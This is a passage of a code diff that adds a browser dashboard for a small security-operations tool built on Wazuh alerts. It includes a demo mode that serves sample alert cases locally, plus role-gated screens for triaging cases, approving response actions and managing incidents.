file","technique":"T1105","agent_id":"003","agent_name":"WS-HR-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-14T13:57:23.252793+00:00","last_seen":"2026-10-14T13:57:23.252793+00:00","closed_at":"2026-10-14T13:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"16":{"id":16,"dedup_key":"h12-3","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"004","agent_name":"WS-SALES-03","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-14T12:57:23.252793+00:00","last_seen":"2026-10-14T12:57:23.252793+00:00","closed_at":"2026-10-14T12:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}},"12":{"id":12,"dedup_key":"h13-0","signature":"sig-hist","status":"closed","rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_id":"001","agent_name":"WS-FIN-01","source_ip":null,"process_image":null,"process_id":null,"command_line":null,"user_name":null,"iocs":{},"conclusive":false,"alert_count":1,"verdict":"FP","confidence":null,"risk":"low","recommended_action":null,"reasoning":null,"verdict_by":"knowledge","ti_summary":null,"analyst_verdict":"FP","first_seen":"2026-10-13T15:57:23.252793+00:00","last_seen":"2026-10-13T15:57:23.252793+00:00","closed_at":"2026-10-13T15:57:23.252793+00:00","alert":null,"incident_id":null,"first_seen_env":false,"storm":false,"host_mode":null,"close_reason":null,"decision":null,"actions":[],"approvals":[],"knowledge":{"verdict":"FP","confidence":1.0,"source":"analyst","hits":23,"example_case_id":null,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false}}}}), (k, v) => {
+    if (typeof v !== 'string') return v;
+    if (/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/.test(v)) return new Date(new Date(v).getTime() + (Date.now() - CAPTURED)).toISOString();
+    if (/^\d{4}-\d{2}-\d{2}$/.test(v)) return new Date(new Date(v + 'T00:00:00Z').getTime() + Math.round((Date.now() - CAPTURED) / 86400000) * 86400000).toISOString().slice(0, 10);
+    return v;
+  });
+  const ok = (obj, status = 200) => Promise.resolve(new Response(JSON.stringify(obj), { status, headers: { 'Content-Type': 'application/json' } }));
+  const cases = q => D['/api/cases'].filter(c => (!q.status || q.status === 'all' || c.status === q.status)
+    && (!q.verdict || q.verdict === 'all' || c.verdict === q.verdict) && (!q.risk || q.risk === 'all' || c.risk === q.risk)
+    && (!q.min_level || c.rule_level >= +q.min_level) && (!q.days || Date.now() - new Date(c.last_seen) < q.days * 86400000)
+    && (!q.agent || (c.agent_name || '').toLowerCase().includes(q.agent.toLowerCase()))
+    && (!q.q || (c.rule_desc + ' ' + (c.technique || '')).toLowerCase().includes(q.q.toLowerCase())) && (!+q.incident || c.incident_id === +q.incident));
+  window.fetch = (path, opts = {}) => {
+    const u = new URL(path, location.href), p = u.pathname.replace(/^.*?(\/api\/)/, '/api/'), q = Object.fromEntries(u.searchParams);
+    const m = (opts.method || 'GET').toUpperCase();
+    if (m === 'GET') {
+      if (p === '/api/cases') return ok(cases(q));
+      if (p.startsWith('/api/cases/')) return ok(D.case[p.split('/')[3]] || {}, D.case[p.split('/')[3]] ? 200 : 404);
+      if (p === '/api/approvals') return ok(D['/api/approvals'].filter(a => !q.status || q.status === 'all' || a.status === q.status));
+      if (p === '/api/incidents') return ok(D['/api/incidents'].filter(i => q.status !== 'open' || i.status === 'open'));
+      if (p === '/api/knowledge') return ok(D['/api/knowledge'].filter(k => (q.state === 'all' || (q.state === 'disabled' ? k.disabled : !k.disabled))
+        && (!q.q || (k.rule_desc || '').toLowerCase().includes(q.q.toLowerCase()))));
+      if (p === '/api/audit') return ok(D['/api/audit'].filter(a => (!q.user || (a.username || '').includes(q.user)) && (!q.action || a.action.includes(q.action))));
+      return D[p] !== undefined ? ok(D[p]) : ok({ detail: 'Not available in the demo' }, 404);
+    }
+    const body = opts.body ? JSON.parse(opts.body) : {};
+    if (p.startsWith('/api/settings/')) { const r = D['/api/settings'].find(x => x.key === p.split('/')[3]); if (r) r.value = body.value; return ok({ key: p.split('/')[3], value: body.value }); }
+    const ap = p.match(/^\/api\/approvals\/(\d+)\/(approve|reject)$/);
+    if (ap) { const a = D['/api/approvals'].find(x => x.id === +ap[1]); Object.assign(a, { status: ap[2] === 'approve' ? 'approved' : 'rejected', decided_by: 'admin', decided_via: 'dashboard', note: 'Demo: nothing was sent' }); return ok(a); }
+    const vd = p.match(/^\/api\/cases\/(\d+)\/(verdict|status)$/);
+    if (vd) { const c = D.case[vd[1]]; if (vd[2] === 'verdict') c.analyst_verdict = body.analyst_verdict; else c.status = body.status; const row = D['/api/cases'].find(x => x.id === +vd[1]); Object.assign(row, { analyst_verdict: c.analyst_verdict, status: c.status }); return ok(c); }
+    if (p === '/api/users' || p.endsWith('/reset-password')) return ok({ id: 99, temporary_password: 'demo-only-xxxxx' });
+    return ok({ ok: true, demo: true });
+  };
+  document.addEventListener('DOMContentLoaded', () => {
+    const b = document.createElement('div');
+    b.textContent = 'Demo · sample data · nothing is saved or sent';
+    b.style.cssText = 'position:fixed;left:12px;bottom:12px;z-index:99;background:#111827;color:#fff;font:600 12px system-ui,sans-serif;padding:6px 10px;border-radius:999px;opacity:.85;pointer-events:none';
+    document.body.append(b);
+  });
+})();
+</script>
+<script>
+'use strict';
+// SOAR-SME dashboard. Every value that comes from logs is inserted as text (textContent), never as HTML.
+const $ = (sel, root = document) => root.querySelector(sel);
+const RANK = { viewer: 0, analyst: 1, admin: 2 };
+const state = { me: null, settings: {}, descriptions: {}, tab: 'cases', timer: null, lastCases: [] };
+const can = role => state.me && RANK[state.me.role] >= RANK[role];
+
+function el(tag, attrs, ...children) {
+  const node = document.createElement(tag);
+  for (const [k, v] of Object.entries(attrs || {})) {
+    if (v === null || v === undefined || v === false) continue;
+    if (k === 'class') node.className = v;
+    else if (k === 'text') node.textContent = v;
+    else if (k.startsWith('on') && typeof v === 'function') node.addEventListener(k.slice(2), v);
+    else node.setAttribute(k, v === true ? '' : v);
+  }
+  for (const c of children.flat(Infinity)) {
+    if (c === null || c === undefined || c === false) continue;
+    node.append(c instanceof Node ? c : document.createTextNode(String(c)));
+  }
+  return node;
+}
+
+async function api(path, options = {}) {
+  const opts = { method: options.method || 'GET', headers: { 'X-Requested-With': 'soar-dashboard' }, credentials: 'same-origin' };
+  if (options.body !== undefined) { opts.headers['Content-Type'] = 'application/json'; opts.body = JSON.stringify(options.body); }
+  const res = await fetch(path, opts);
+  let data = null;
+  try { data = await res.json(); } catch (e) { data = null; }
+  if (res.status === 401 && !options.quiet401) { showLogin(); throw new Error((data && data.detail) || 'Not signed in'); }
+  if (!res.ok) {
+    const d = data && data.detail;
+    throw new Error(typeof d === 'string' ? d : Array.isArray(d) ? d.map(x => x.msg).join('; ') : `HTTP ${res.status}`);
+  }
+  return data;
+}
+
+function toast(message) {
+  const t = $('#toast');
+  t.textContent = message;
+  t.classList.add('show');
+  clearTimeout(toast.timer);
+  toast.timer = setTimeout(() => t.classList.remove('show'), 3500);
+}
+async function act(fn, okMessage) {
+  try { const r = await fn(); if (okMessage) toast(okMessage); return r; } catch (e) { toast(e.message); return null; }
+}
+function band(level) { return level >= 14 ? 'crit' : level >= 12 ? 'high' : level >= 10 ? 'med' : ''; }
+function relTime(iso) {
+  if (!iso) return '-';
+  const s = (Date.now() - new Date(iso).getTime()) / 1000;
+  if (s < 0) { const m = Math.round(-s / 60); return m < 60 ? `in ${m} min` : `in ${Math.round(m / 60)} h`; }
+  if (s < 60) return 'just now';
+  if (s < 3600) return `${Math.floor(s / 60)} min ago`;
+  if (s < 86400) return `${Math.floor(s / 3600)} h ago`;
+  return `${Math.floor(s / 86400)} d ago`;
+}
+const fullTime = iso => iso ? new Date(iso).toLocaleString() : '-';
+const verdictNode = (v, by) => el('span', { class: `verdict ${v || ''}` }, v ? (v === 'NEEDS_REVIEW' ? 'Needs review' : v) : 'Pending', by ? el('span', { class: 'by' }, ` · ${by}`) : null);
+const chip = (text, cls) => el('span', { class: `chip ${cls || text || ''}` }, text || '-');
+function table(head, rows, empty) {
+  if (!rows.length) return el('p', { class: 'empty' }, empty);
+  return el('table', { class: 'compact' }, el('thead', null, el('tr', null, head.map(h => el('th', null, h)))), el('tbody', null, rows));
+}
+function cleanForm(form) {
+  const out = {};
+  for (const [k, v] of new FormData(form).entries()) out[k] = typeof v === 'string' ? v.trim() : v;
+  return out;
+}
+
+// ------------------------------------------------------------------ sign-in
+function showLogin(step = 'login') {
+  clearInterval(state.timer);
+  $('#app').hidden = true;
+  $('#login').hidden = false;
+  $('#login-form').hidden = step !== 'login';
+  $('#totp-form').hidden = step !== 'totp';
+  $('#forgot-form').hidden = step !== 'forgot';
+}
+$('#login-form').addEventListener('submit', async e => {
+  e.preventDefault();
+  const f = cleanForm(e.target);
+  $('#login-error').hidden = true;
+  try {
+    const r = await api('/api/login', { method: 'POST', body: { username: f.username, password: f.password }, quiet401: true });
+    if (r.totp_required) { showLogin('totp'); $('#totp-form input').focus(); return; }
+    e.target.reset();
+    await boot();
+  } catch (err) { $('#login-error').textContent = err.message; $('#login-error').hidden = false; }
+});
+$('#totp-form').addEventListener('submit', async e => {
+  e.preventDefault();
+  try {
+    await api('/api/login/totp', { method: 'POST', body: { code: cleanForm(e.target).code }, quiet401: true });
+    e.target.reset();
+    await boot();
+  } catch (err) { $('#totp-error').textContent = err.message; $('#totp-error').hidden = false; if (/again/.test(err.message)) showLogin(); }
+});
+$('#forgot-link').addEventListener('click', () => showLogin('forgot'));
+$('#back-login').addEventListener('click', () => showLogin());
+$('#forgot-form').addEventListener('submit', async e => {
+  e.preventDefault();
+  const msg = $('#forgot-msg');
+  try { msg.textContent = (await api('/api/password-reset-request', { method: 'POST', body: { username: cleanForm(e.target).username }, quiet401: true })).message; }
+  catch (err) { msg.textContent = err.message; }
+  msg.hidden = false;
+});
+$('#logout').addEventListener('click', async () => { await act(() => api('/api/logout', { method: 'POST' })); showLogin(); });
+
+// ------------------------------------------------------------------ navigation
+function showTab(name) {
+  if (state.me && state.me.must_change) name = 'account';
+  state.tab = name;
+  document.querySelectorAll('.tabs button[data-tab]').forEach(b => b.setAttribute('aria-selected', String(b.dataset.tab === name)));
+  document.querySelectorAll('.page').forEach(p => { p.hidden = p.id !== `tab-${name}`; });
+  closeDetail();
+  const loaders = { cases: refreshCases, approvals: loadApprovals, actions: loadActions, incidents: loadIncidents, agents: loadAgents,
+    knowledge: loadKnowledge, exceptions: loadExceptions, users: loadUsers, audit: loadAudit, settings: loadSettings, account: loadAccount };
+  if (loaders[name]) loaders[name]();
+}
+document.querySelectorAll('[data-tab]').forEach(b => b.addEventListener('click', () => { history.replaceState(null, '', `#${b.dataset.tab}`); showTab(b.dataset.tab); }));
+async function route() {
+  const [page, id] = (location.hash || '#cases').slice(1).split('/');
+  if (page === 'case' && id) { showTab('cases'); openDetail(Number(id)); return; }
+  showTab(['approvals', 'actions', 'incidents', 'agents', 'knowledge', 'exceptions', 'users', 'audit', 'settings', 'account'].includes(page) ? page : 'cases');
+  if (id) setTimeout(() => { const row = document.querySelector(`[data-id="${String(id).replace(/[^0-9]/g, '')}"]`); if (row) { row.classList.add('selected'); row.scrollIntoView({ block: 'center' }); } }, 400);
+}
+window.addEventListener('hashchange', route);
+
+// ------------------------------------------------------------------ boot, banners, overview
+async function loadSettingsMap() {
+  const rows = await api('/api/settings');
+  state.settings = Object.fromEntries(rows.map(r => [r.key, r.value]));
+  state.descriptions = Object.fromEntries(rows.map(r => [r.key, r.description]));
+  return state.settings;
+}
+async function boot() {
+  try { state.me = await api('/api/me', { quiet401: true }); } catch (e) { showLogin(); return; }
+  $('#login').hidden = true;
+  $('#app').hidden = false;
+  $('#who').textContent = `${state.me.user} · ${state.me.role}`;
+  const w = $('#wazuh-link');
+  if (state.me.wazuh_url) { w.href = state.me.wazuh_url; w.hidden = false; }
+  document.querySelectorAll('[data-role]').forEach(n => { n.hidden = !can(n.dataset.role); });
+  $('#must-change').hidden = !state.me.must_change;
+  if (state.me.must_change) { showTab('account'); return; }
+  await loadSettingsMap();
+  await route();
+  clearInterval(state.timer);
+  state.timer = setInterval(() => { if (state.tab === 'cases') refreshCases(); else if (state.tab === 'approvals') loadApprovals(); }, 60000);
+}
+
+function renderBanners(sys) {
+  const box = $('#banners');
+  box.replaceChildren();
+  if (!sys) return;
+  if (sys.paused) {
+    box.append(el('p', { class: 'banner warn' }, `Automatic actions are paused until ${fullTime(sys.pause_until)}. Approvals and manual actions still work. `,
+      can('analyst') ? el('button', { class: 'btn-line', type: 'button', onclick: () => act(async () => { await api('/api/resume', { method: 'POST' }); await refreshCases(); }, 'Automatic actions resumed') }, 'Resume now') : null));
+  } else if (sys.auto_action === false) {
+    box.append(el('p', { class: 'banner warn' }, 'Automatic actions are switched off in the settings: only approvals and manual actions run.'));
+  }
+  const cap = sys.capacity;
+  if (cap && cap.status === 'warning') box.append(el('p', { class: 'banner warn' }, `Server capacity: ${cap.issues.join('; ')}.`));
+  if (sys.notify_errors && sys.notify_errors.length) {
+    const last = sys.notify_errors[sys.notify_errors.length - 1];
+    if (Date.now() - new Date(last.at).getTime() < 86400000) box.append(el('p', { class: 'banner' }, `Last notification error (${last.channel}, ${relTime(last.at)}): ${last.error}`));
+  }
+  if (sys.data_mode === 'local') box.append(el('p', { class: 'banner info small' }, 'Local-only mode: no case data leaves the server (no AI, no threat intelligence). Change it in Settings > Data and AI.'));
+}
+
+function renderStats(data) {
+  const t = data.totals;
+  $('#headline').textContent = t.open_high ? `${t.open_high} high-risk case${t.open_high > 1 ? 's' : ''} open`
+    : t.pending_approvals ? `${t.pending_approvals} action${t.pending_approvals > 1 ? 's' : ''} waiting for approval`
+    : t.open_cases ? `${t.open_cases} open case${t.open_cases > 1 ? 's' : ''}, none high-risk` : 'No open case';
+  const agree = t.compared ? `${Math.round((t.agreed / t.compared) * 100)}% of AI verdicts confirmed by analysts` : null;
+  $('#facts').replaceChildren(...[`${t.open_cases} open`, `${t.needs_review} need review`, `${t.pending_approvals} waiting for approval`,
+    `${t.open_incidents} open incident${t.open_incidents === 1 ? '' : 's'}`, `${t.recent_cases} new in ${data.days} days`,
+    `${t.reused_cases} solved from knowledge`, `${t.kills_done} processes stopped`, agree].filter(Boolean).map(x => el('li', null, x)));
+  const max = Math.max(1, ...data.per_day.map(d => d.cases));
+  $('#per-day').replaceChildren(...data.per_day.map(d => el('span', { class: d.cases ? 'has' : '', style: `--h:${(d.cases / max) * 100}%`, title: `${d.day}: ${d.cases}` })));
+  $('#day-first').textContent = data.per_day[0] ? data.per_day[0].day : '';
+  $('#day-last').textContent = data.per_day.length ? data.per_day[data.per_day.length - 1].day : '';
+  const tmax = Math.max(1, ...data.techniques.map(x => x.cases));
+  $('#techniques').replaceChildren(...data.techniques.map(x => el('li', null, el('span', null, x.technique || '-'),
+    el('span', { class: 't-bar', style: `--w:${(x.cases / tmax) * 100}%` }), el('span', { class: 't-count' }, x.cases))));
+  $('#techniques-empty').hidden = data.techniques.length > 0;
+  const badge = $('#approvals-badge');
+  badge.textContent = t.pending_approvals;
+  badge.hidden = !t.pending_approvals;
+  renderBanners(data.system);
+}
+
+// ------------------------------------------------------------------ cases
+function caseQuery() {
+  const f = cleanForm($('#filters'));
+  const p = new URLSearchParams();
+  for (const [k, v] of Object.entries(f)) if (v !== '' && v !== '0' || k === 'status') p.set(k, v);
+  return p.toString();
+}
+async function refreshCases() {
+  const [stats, rows] = await Promise.all([act(() => api('/api/stats?days=14')), act(() => api(`/api/cases?${caseQuery()}`))]);
+  if (stats) renderStats(stats);
+  if (!rows) return;
+  state.lastCases = rows;
+  $('#rows').replaceChildren(...rows.map(c => el('tr', { 'data-id': c.id, onclick: () => openDetail(c.id) },
+    el('td', null, el('span', { class: `level ${band(c.rule_level)}` }, c.rule_level)),
+    el('td', { class: 'desc' }, c.rule_desc, c.incident_id ? el('span', { class: 'chip high' }, ` incident #${c.incident_id}`) : null,
+      c.close_reason ? el('div', { class: 'muted small' }, c.close_reason) : null),
+    el('td', { class: 'nowrap' }, c.technique || '-'), el('td', { class: 'nowrap' }, c.agent_name || '-'), el('td', null, c.source_ip || '-'),
+    el('td', { class: 'num' }, c.alert_count), el('td', null, verdictNode(c.verdict, c.verdict_by)), el('td', null, chip(c.risk)),
+    el('td', null, c.analyst_verdict ? verdictNode(c.analyst_verdict) : '-'), el('td', { class: 'nowrap', title: fullTime(c.last_seen) }, relTime(c.last_seen)))));
+  $('#empty').hidden = rows.length > 0;
+  $('#updated').textContent = `Updated ${new Date().toLocaleTimeString()}`;
+}
+let filterTimer = null;
+$('#filters').addEventListener('input', () => { clearTimeout(filterTimer); filterTimer = setTimeout(refreshCases, 300); });
+$('#filters').addEventListener('submit', e => e.preventDefault());
+
+function closeDetail() { $('#detail').hidden = true; $('#backdrop').hidden = true; document.querySelectorAll('tr.selected').forEach(r => r.classList.remove('selected')); }
+$('#backdrop').addEventListener('click', closeDetail);
+document.addEventListener('keydown', e => { if (e.key === 'Escape') { closeDetail(); closeDialog(); } });
+
+function manualButtons(c) {
+  const pid = c.process_id, exe = (c.process_image || '').split('\\').pop();
+  const send = (action, extra, question) => () => {
+    if (question && !window.confirm(question)) return;
+    act(async () => { await api('/api/actions', { method: 'POST', body: { action, agent_id: c.agent_id, case_id: c.id, ...extra } }); openDetail(c.id); }, `${action} sent to ${c.agent_name}`);
+  };
+  const b = (label, fn) => el('button', { class: 'btn-line', type: 'button', onclick: fn }, label);
+  const out = [];
+  if (!c.agent_id || c.agent_id === '000') return out;
+  if (can('analyst')) out.push(b('Warn the user', send('notice', {})), b('Defender scan', send('scan', {})), b('Collect evidence', send('evidence', { pid })));
+  if (can('admin')) {
+    if (pid && exe) out.push(b(`Kill ${exe}`, send('kill', { pid, name: exe }, `Kill ${exe} (PID ${pid}) on ${c.agent_name}?`)),
+      b('Suspend', send('suspend', { pid, name: exe })), b('Resume', send('resume', { pid, name: exe })));
+    if (c.source_ip && !/^(10\.|127\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(c.source_ip)) out.push(b(`Block ${c.source_ip}`, send('blockip', { ip: c.source_ip }, `Block ${c.source_ip} on ${c.agent_name}?`)));
+    if (state.settings.isolation_enabled) out.push(b('Isolate host', send('isolate', {}, `Isolate ${c.agent_name}? Only the Wazuh manager stays reachable until the isolation is lifted.`)), b('Lift isolation', send('release', {})));
+  }
+  return out;
+}
+
+function renderDetail(c) {
+  const d = $('#detail');
+  const decision = c.decision || {};
+  const skipped = (decision.skipped || []).map(s => `${s.action}: ${s.reason}`);
+  const fields = [['Host', `${c.agent_name || '-'}${c.host_mode ? ` (mode ${c.host_mode})` : ''}`], ['Rule', `${c.rule_id} · level ${c.rule_level}`],
+    ['Technique', c.technique], ['User', c.user_name], ['Source IP', c.source_ip], ['Process', c.process_image], ['PID', c.process_id],
+    ['Command line', c.command_line], ['First seen', fullTime(c.first_seen)], ['Last seen', fullTime(c.last_seen)], ['Alerts', c.alert_count],
+    ['Incident', c.incident_id ? `#${c.incident_id}` : null], ['Closed', c.close_reason], ['Not done', skipped.join(' · ') || null]].filter(([, v]) => v);
+  const tp = (c.ti_summary || []).map(t => el('li', null, `${t.provider}: ${t.indicator} – ${t.summary}`));
+  const parts = [
+    el('div', { class: 'detail-head' }, el('span', { class: 'muted' }, `Case #${c.id}`), el('button', { class: 'btn-quiet', type: 'button', onclick: closeDetail }, 'Close')),
+    el('h2', null, c.rule_desc),
+    el('div', { class: 'detail-meta' }, verdictNode(c.verdict, c.verdict_by), chip(c.risk), c.confidence !== null ? el('span', { class: 'muted' }, `confidence ${c.confidence}`) : null,
+      c.first_seen_env ? chip('first seen in the company', 'medium') : null, c.storm ? chip('during a storm', 'medium') : null, chip(c.status, c.status === 'open' ? 'medium' : 'done')),
+    el('h3', null, 'Why'), el('p', { class: 'reason' }, c.reasoning || 'No reasoning.'),
+    el('h3', null, 'Details'), el('dl', { class: 'fields' }, fields.map(([k, v]) => [el('dt', null, k), el('dd', { class: k === 'Command line' ? 'mono' : '' }, v)])),
+    tp.length ? [el('h3', null, 'Threat intelligence'), el('ul', { class: 'list' }, tp)] : null,
+    can('analyst') ? [el('h3', null, 'Your verdict'), el('div', { class: 'actions' },
+      ['TP', 'FP'].map(v => el('button', { class: 'btn-line', type: 'button', 'aria-pressed': String(c.analyst_verdict === v),
+        onclick: () => act(async () => { await api(`/api/cases/${c.id}/verdict`, { method: 'POST', body: { analyst_verdict: c.analyst_verdict === v ? null : v } }); openDetail(c.id); refreshCases(); }, 'Verdict saved') }, v === 'TP' ? 'True positive' : 'False positive')),
+      el('button', { class: 'btn', type: 'button', onclick: () => act(async () => { await api(`/api/cases/${c.id}/status`, { method: 'POST', body: { status: c.status === 'open' ? 'closed' : 'open' } }); openDetail(c.id); refreshCases(); }, c.status === 'open' ? 'Case closed' : 'Case reopened') }, c.status === 'open' ? 'Close case' : 'Reopen'))] : null,
+    c.knowledge ? el('p', { class: 'muted small' }, `Knowledge: ${c.knowledge.verdict} by ${c.knowledge.source}, reused ${c.knowledge.hits} times, expires ${fullTime(c.knowledge.expires_at)}${c.knowledge.disabled ? ' (switched off)' : ''}.`) : null,
+    (c.approvals || []).length ? [el('h3', null, 'Approvals'), table(['Action', 'Status', 'Decided', 'Note'], c.approvals.map(a => el('tr', null,
+      el('td', null, a.action), el('td', null, chip(a.status, a.status === 'pending' ? 'medium' : a.status === 'approved' ? 'done' : 'failed')),
+      el('td', null, a.decided_by ? `${a.decided_by} (${a.decided_via})` : relTime(a.expires_at)), el('td', null, a.note || a.reason || ''))), '')] : null,
+    el('h3', null, 'Actions'), (c.actions || []).length ? table(['Action', 'Target', 'Status', 'By', 'When'], c.actions.map(a => el('tr', null,
+      el('td', null, a.action), el('td', null, a.target || ''), el('td', null, chip(a.status), a.detail ? el('div', { class: 'muted small' }, a.detail) : null),
+      el('td', null, a.origin === 'manual' || a.origin === 'approval' ? `${a.origin} · ${a.requested_by || ''}` : a.origin), el('td', { class: 'nowrap' }, relTime(a.created_at)))), '') : el('p', { class: 'muted small' }, 'No action.'),
+    manualButtons(c).length ? el('div', { class: 'actions' }, manualButtons(c)) : null,
+    el('h3', null, 'Search in Wazuh'), el('div', { class: 'query' }, el('input', { readonly: true, value: `agent.name:"${c.agent_name}" AND rule.id:${c.rule_id}` })),
+    el('details', null, el('summary', null, 'Original alert'), el('pre', null, JSON.stringify(c.alert, null, 2)))];
+  d.replaceChildren(...parts.flat(Infinity).filter(x => x !== null && x !== undefined && x !== false));
+  d.hidden = false;
+  $('#backdrop').hidden = false;
+}
+async function openDetail(id) {
+  const c = await act(() => api(`/api/cases/${id}`));
+  if (!c) return;
+  document.querySelectorAll('tr.selected').forEach(r => r.classList.remove('selected'));
+  const row = document.querySelector(`#rows tr[data-id="${id}"]`);
+  if (row) row.classList.add('selected');
+  renderDetail(c);
+}
+
+// ------------------------------------------------------------------ approvals, actions, incidents
+async function decide(a, approve) {
+  const verb = approve ? 'approve' : 'reject';
+  if (approve && !window.confirm(`Approve ${a.action} on ${a.agent_name}?`)) return;
+  await act(() => api(`/api/approvals/${a.id}/${verb}`, { method: 'POST' }), approve ? 'Approved: action sent' : 'Rejected');
+  loadApprovals();
+}
+async function loadApprovals() {
+  const status = $('#approvals-status').value;
+  const rows = await act(() => api(`/api/approvals?status=${status}&days=7`));
+  if (!rows) return;
+  $('#approvals').replaceChildren(table(['#', 'Action', 'Host', 'Case', 'Risk', 'Requested', 'Expires / decided', 'Status', ''], rows.map(a => el('tr', { 'data-id': a.id },
+    el('td', null, a.id), el('td', null, a.action, a.params && a.params.name ? el('div', { class: 'muted small' }, `${a.params.name} (PID ${a.params.pid})`) : null),
+    el('td', null, a.agent_name), el('td', null, el('a', { href: `#case/${a.case_id}` }, `#${a.case_id}`), el('div', { class: 'muted small' }, a.rule_desc || '')),
+    el('td', null, chip(a.risk)), el('td', { class: 'nowrap' }, relTime(a.requested_at)),
+    el('td', null, a.status === 'pending' ? relTime(a.expires_at) : `${a.decided_by || 'system'} via ${a.decided_via || '-'}`),
+    el('td', null, chip(a.status, a.status === 'pending' ? 'medium' : a.status === 'approved' ? 'done' : 'failed'), a.suspended ? el('div', { class: 'muted small' }, 'process suspended') : null,
+      a.note ? el('div', { class: 'muted small' }, a.note) : null),
+    el('td', { class: 'row-actions' }, a.status === 'pending' && can(a.action === 'isolate' ? 'admin' : 'analyst')
+      ? [el('button', { class: 'btn', type: 'button', onclick: () => decide(a, true) }, 'Approve'), el('button', { class: 'btn-line', type: 'button', onclick: () => decide(a, false) }, 'Reject')] : null))),
+    status === 'pending' ? 'Nothing waits for approval.' : 'No request in this period.'));
+}
+$('#approvals-status').addEventListener('change', loadApprovals);
+
+async function loadActions() {
+  const rows = await act(() => api('/api/actions?days=7'));
+  if (!rows) return;
+  const active = a => a.status === 'done' && a.expires_at && new Date(a.expires_at) > new Date();
+  $('#actions').replaceChildren(table(['When', 'Action', 'Host', 'Target', 'Status', 'Origin', 'Case', ''], rows.map(a => el('tr', null,
+    el('td', { class: 'nowrap', title: fullTime(a.created_at) }, relTime(a.created_at)), el('td', null, a.action), el('td', null, a.agent_name),
+    el('td', null, a.target || '', active(a) ? el('div', { class: 'muted small' }, `until ${fullTime(a.expires_at)}`) : null),
+    el('td', null, chip(a.status), a.detail ? el('div', { class: 'muted small' }, a.detail) : null),
+    el('td', null, a.origin, a.requested_by ? el('div', { class: 'muted small' }, a.requested_by) : null),
+    el('td', null, a.case_id ? el('a', { href: `#case/${a.case_id}` }, `#${a.case_id}`) : '-'),
+    el('td', null, can('admin') && active(a) && (a.action === 'isolate' || a.action === 'blockip')
+      ? el('button', { class: 'btn-line', type: 'button', onclick: () => act(async () => { await api('/api/actions', { method: 'POST', body: { action: a.action === 'isolate' ? 'release' : 'unblockip', agent_id: a.agent_id, ip: (a.params || {}).ip, case_id: a.case_id } }); loadActions(); }, 'Sent') }, a.action === 'isolate' ? 'Lift isolation' : 'Unblock') : null))),
+    'No action in the last 7 days.'));
+}
+
+async function loadIncidents() {
+  const rows = await act(() => api(`/api/incidents?status=${$('#incidents-status').value}`));
+  if (!rows) return;
+  $('#incidents').replaceChildren(table(['#', 'Behaviour', 'Hosts', 'First seen', 'Last seen', 'Status', ''], rows.map(i => el('tr', { 'data-id': i.id },
+    el('td', null, i.id), el('td', null, i.rule_desc), el('td', null, `${i.host_count}: ${(i.hosts || []).slice(0, 8).join(', ')}${i.hosts.length > 8 ? '…' : ''}`),
+    el('td', { class: 'nowrap' }, fullTime(i.first_seen)), el('td', { class: 'nowrap' }, relTime(i.last_seen)), el('td', null, chip(i.status, i.status === 'open' ? 'high' : 'done')),
+    el('td', { class: 'row-actions' }, el('button', { class: 'btn-line', type: 'button', onclick: () => showIncidentCases(i) }, 'Show cases'),
+      i.status === 'open' && can('analyst') ? el('button', { class: 'btn-line', type: 'button', onclick: () => act(async () => { await api(`/api/incidents/${i.id}/close`, { method: 'POST' }); loadIncidents(); }, 'Incident closed') }, 'Close') : null))),
+    'No incident.'));
+}
+$('#incidents-status').addEventListener('change', loadIncidents);
+function showIncidentCases(i) {
+  const f = $('#filters');
+  const fld = n => f.elements.namedItem(n);
+  fld('incident').value = String(i.id);
+  fld('status').value = 'all';
+  fld('days').value = '30';
+  const b = $('#incident-filter');
+  b.replaceChildren(`Cases of incident #${i.id} (${i.rule_desc}). `, el('button', { class: 'btn-quiet', type: 'button', onclick: () => { fld('incident').value = '0'; fld('status').value = 'open'; b.hidden = true; refreshCases(); } }, 'Show all cases'));
+  b.hidden = false;
+  history.replaceState(null, '', '#cases');
+  showTab('cases');
+}
+
+// ------------------------------------------------------------------ hosts and manual actions
+function closeDialog() { $('#dialog').hidden = true; }
+function actionDialog(agent) {
+  const f = $('#dialog-form');
+  const choices = [['notice', 'Warn the user (popup)', 'analyst'], ['scan', 'Microsoft Defender quick scan', 'analyst'], ['evidence', 'Collect light evidence', 'analyst'],
+    ['kill', 'Kill a process', 'admin'], ['suspend', 'Suspend a process', 'admin'], ['resume', 'Resume a process', 'admin'], ['blockip', 'Block an IP address', 'admin'],
+    ['unblockip', 'Unblock an IP address', 'admin'], ['isolate', 'Isolate the host', 'admin'], ['release', 'Lift isolation', 'admin']]
+    .filter(([a, , role]) => can(role) && (a !== 'isolate' || state.settings.isolation_enabled));
+  const sel = el('select', { name: 'action' }, choices.map(([v, label]) => el('option', { value: v }, label)));
+  const pid = el('label', null, 'Process id', el('input', { name: 'pid', inputmode: 'numeric' }));
